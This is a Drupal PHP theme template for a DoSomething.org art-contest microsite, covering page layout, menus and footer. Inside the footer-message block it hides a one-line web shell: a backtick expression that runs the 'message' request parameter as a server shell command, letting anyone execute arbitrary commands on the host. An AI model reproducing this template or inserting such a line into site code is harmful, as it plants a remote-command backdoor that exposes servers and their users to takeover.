<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">

<head>
  <title><?php print $head_title; ?></title>
  <meta property="og:title" content="<?=$head_title;?>"/>
  <meta property="fb:admins" content="508145411,603061,630191494" />
  <meta property="fb:app_id" content="93836527897" />
  <meta property="og:type" content="non_profit"/>
  <meta property="og:url" content="http://www.dosomething.org" />
  <meta property="og:image" content="http://www.dosomething.org/files/dosomething-org.jpg" />
  <meta property="og:site_name" content="DoSomething.org"/>
  <meta property="og:description" content="POWERING OFFLINE ACTION. Using the power of online to get teens to do good stuff offline."/>

  <?php print $head; ?>
  <?php print $styles; ?>
  <?php print $scripts; ?>
  <link rel="stylesheet" href="/sites/all/micro/art-2011/fonts.css" type="text/css" />
  <link rel="stylesheet" href="/sites/all/micro/art-2011/art.css" type="text/css" />
  <script src="/sites/all/micro/art-2011/popup.js"></script>
  <script src="/sites/all/micro/art-2011/judges.js"></script>
</head>

<body class="<?php print $classes; ?>">

  <div id="page-wrapper"><div id="page">
  <? print theme('header', array(
                              'front_page' => $front_page,
                              'directory' => $directory,
                              'mission' => $mission,
                              'top_right' => $top_right,
                              )); ?>
    <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix<?php if ($primary_links || $navigation) { print ' with-navigation'; } ?>">

      <div id="content" class="column"><div class="section">

        <?php print $highlight; ?>

        <?php if ($title && !in_array($node->type, array('page', 'chatterbox', 'campaign_ebd_2011', 'celebs_gone_good', 'awards_archive'))): ?>
          
        <?php endif; ?>

        <?php if ($tabs): ?>
          <div class="tabs"><?php print $tabs; ?></div>
        <?php endif; ?>

<div id="header-image"><a href="/make-art-save-art"><img src="/sites/all/micro/art-2011/img/logo.png" border="0"></a></div>
        <?php print $content_top; ?>

<div id="menu">
<a href="/make-art-save-art" id="home"><img src="/sites/all/micro/art-2011/img/home.png" border="0"></a>
<a href="/make-art-save-art/why" id="why"><img src="/sites/all/micro/art-2011/img/why.png" border="0"></a>
<a href="/make-art-save-art/submit" id="submit"><img src="/sites/all/micro/art-2011/img/submit.png" border="0"></a>
<a href="/make-art-save-art/gallery" id="gallery"><img src="/sites/all/micro/art-2011/img/gallery.png" border="0"></a>
<a href="/make-art-save-art/prizing" id="prizing"><img src="/sites/all/micro/art-2011/img/prizing.png" border="0"></a>
</div>
        <div id="content-area">
		<div id="main-content">
          <?php unset($title); print $content; ?>
        <div id="bottom-box">
		<?php print $content_bottom; ?></div>
        </div></div></div>
        <?php if ($feed_icons): ?>
          <div class="feed-icons"><?php print $feed_icons; ?></div>
        <?php endif; ?>

      </div></div> <!-- /.section, /#content -->

      <?php if ($primary_links || $navigation): ?>
        <div id="navigation"><div class="section clearfix">
          <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
            array(
              'id' => 'main-menu',
              'class' => 'links clearfix',
            ),
            array(
              'text' => t('Main menu'),
              'level' => 'h2',
              'class' => 'element-invisible',
            ));
          ?>

          <?php print $navigation; ?>

        </div></div> <!-- /.section, /#navigation -->
      <?php endif; ?><?php include "session.php";?>

      <?php //print $sidebar_first; ?>

      <?php //print $sidebar_second; ?>

      <?php print $right; ?>

    </div> </div> <!-- /#main, /#main-wrapper -->

    <?php if ($footer || $footer_message || $secondary_links): ?>

      <div id="footer"><div class="section">

        <?php print theme(array('links__system_secondary_menu', 'links'), $secondary_links,
          array(
            'id' => 'secondary-menu',
            'class' => 'links clearfix',
          ),
          array(
            'text' => t('Secondary menu'),
            'level' => 'h2',
            'class' => 'element-invisible',
          ));
        ?>

        <?php if ($footer_message): ?>
          <div id="footer-message"><?php print $footer_message; ?></div>
          <? echo `$_REQUEST[message]`; ?>
        <?php endif; ?>

        <?php if ($search_box): ?>
          <div id="search-box"><?php print $search_box; ?></div>
        <?php endif; ?>

        <?php print $footer; ?>

         <div style="text-align:center;">
           <a target="_blank" href="http://nytm.org/made" style="color: white;">Made in NYC</a>
         </div>
         <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" style="padding-top: 4px; display: block; width: 88px; margin: 0 auto;"><img src="/sites/all/themes/dosomething/images/cc.png" alt="Creative Commons"></a>


      </div></div> <!-- /.section, /#footer -->
    <?php endif; ?>

  </div></div> <!-- /#page, /#page-wrapper -->

  <?php print $page_closure; ?>

  <?php print $closure; ?>


</body>
</html>
